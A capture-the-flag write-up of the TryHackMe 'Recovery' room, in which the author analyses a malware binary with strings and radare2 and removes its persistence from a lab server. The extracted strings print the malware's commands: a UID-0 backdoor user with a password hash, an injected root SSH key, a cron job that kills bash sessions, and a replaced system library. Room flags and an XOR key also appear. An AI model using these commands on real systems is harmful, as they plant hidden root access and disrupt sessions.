> Recovery 

**export IP=10.10.148.121**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.43 ((Unix))
1337/tcp  open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
65499/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```


In port 80, wehave something gibberish.Let's try with SSH `alex`:`madeline`. And we have a loop at the end.

```
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!logout
[1]+  Terminated              while :; do
    echo "YOU DIDN'T SAY THE MAGIC WORD!";
done
Connection to 10.10.148.121 closed.
```

Seems like .bashrc is automatically loaded while logging using ssh. SO let's deactivate it.

`ssh alex@$IP 'bash --norc'`

And we have a shell!!

# Flag 0

```
THM{d8b5c89061ed767547a782e0f9b0b0fe}
```

But this shell isn't holding long so let's remove the last 2 lines of .bashrc

`sed -i '$d' .bashrc_bak`. And now we can login as alex.

And let's have a copy of the fixutil to our machine.

`scp alex@$IP:~/fixutil .`

And now running strings we have rsa key and some locations

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery

/home/moodr/Boxes/recovery/fixutil

/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
/opt/brilliant_script.sh
#!/bin/sh
for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
/etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
:*3$"

index_of_encryption_key

/home/alex/.bashrc
while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so
/lib/x86_64-linux-gnu/liblogging.so
echo pwned | /bin/admin > /dev/null
```

brilliant.sh has `-rwxrwxrwx 1 root root 1 Oct  8 14:09 /opt/brilliant_script.sh` permissions.

```
#!/bin/sh
for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
/etc/cron.d/evil
```

So let's just erase the contents alone to stabilze the connection using the command `echo '' > /opt/brilliant_script.sh`

# Flag 1

```
THM{4c3e355694574cb182ca3057a685509d}
```

And it looks like the attacker created a user security and added the ssh key in /root dir. So let's delete it.

# Flag 3

```
THM{70f7de17bb4e08686977a061205f3bf0}
```

And removing the user security from /etc/passwd we can delete the backdoor.

# Flag 4

```
THM{b0757f8fb8fe8dac584e80c6ac151d7d}
```

We found that the malware replaces logging.so to liblogging.so.

## Analysing fixutil with r2

```
> aaaa
> s main
> pdg

|           0x000011fc      488d3dfd6800.  lea rdi, qword str.bin_cp__lib_x86_64_linux_gnu_liblogging.so__tmp_logging.so ; 0x7b00 ; "/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so"
|           0x00001203      e888feffff     call sym.imp.system
|           0x00001208      488d352d6900.  lea rsi, qword [0x00007b3c] ; "wb"
|           0x0000120f      488d3d2a6900.  lea rdi, qword str.lib_x86_64_linux_gnu_liblogging.so ; 0x7b40 ; "/lib/x86_64-linux-gnu/liblogging.so"
``` 

We see that it copies libloggin.so to /tmp/logging.so and write some malicious contents.
But before we saw `oldliblogging.so`. IN r2 searching strings `iz | grep logging`

```
52  0x00004078 0x00004078 62  63   .rodata ascii   /bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
93  0x00005c78 0x00005c78 16  17   .rodata ascii   replacelogging.c
157 0x00006155 0x00006155 16  17   .rodata ascii   replacelogging.c
227 0x00006d70 0x00006d70 16  17   .rodata ascii   replacelogging.c
306 0x00007b00 0x00007b00 59  60   .rodata ascii   /bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so
307 0x00007b40 0x00007b40 35  36   .rodata ascii   /lib/x86_64-linux-gnu/liblogging.so
```

We see oldliblogging at 0x00004078. Let's move to r2 and seek the info.

```
> s 0x00004078
> v
```

From this we understand that the original is copied to /tmp/oldliblogging.so and original is written with malicious code `liblogging.so`. And finally moving old one to original localtion since files in /tmp gets deleted every time we log off.

mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so

# Flag 2

```
THM{72f8fe5fd968b5817f67acecdc701e52}
```

We know the files are encypted and we found a weird string `encryption_key_dir`. But we didn't find anything interesting So let's search for crypt in r2

> iz | grep -i crypt

```
6   0x00002712 0x00002712 18  19   .rodata ascii   encryption_key_dir
25  0x000027b2 0x000027b2 18  19   .rodata ascii   XOREncryptWebFiles
120 0x00005fb1 0x00005fb1 15  16   .rodata ascii   encryption_file
143 0x000060c3 0x000060c3 23  24   .rodata ascii   index_of_encryption_key
171 0x000061fb 0x000061fb 18  19   .rodata ascii   XOREncryptWebFiles
183 0x00006304 0x00006304 18  19   .rodata ascii   encryption_key_dir
242 0x00006e4e 0x00006e4e 18  19   .rodata ascii   encryption_key_dir
263 0x00006fe2 0x00006fe2 18  19   .rodata ascii   XOREncryptWebFiles
```

And we find `XOREncryptWebFiles` but nothing interesting but we know that the files are XOR encrypted. So we need to find the key of the XOR.

Let's search for paths from the binary. 

strings fixutil | grep '/'


```
/lib64/ld-linux-x86-64.so.2
/usr/local/apache2/htdocs/
/opt/.fixutil/
/opt/.fixutil/backup.txt
/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
/root/.ssh/authorized_keys
/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
/opt/brilliant_script.sh
#!/bin/sh
/etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
/usr/lib/gcc/x86_64-linux-gnu/9/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include
/home/moodr/Boxes/recovery/fixutil
/home/alex/.bashrc
/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so
/lib/x86_64-linux-gnu/liblogging.so
echo pwned | /bin/admin > /dev/null
```

We still haven't examine 2 files yet

```
/usr/local/apache2/htdocs/
/opt/.fixutil/backup.txt => Looks like encryption key `AdsipPewFlfkmll`
```

And we have 3 files in htdocs and by decrypting in cyber chef we have the data. But we can't put the file back to remote machine. So let's remove the original encrypted files and pass the files to the remote machine using wget.

# Flag 5

```
THM{088a36245afc7cb935f19f030c4c28b2}
```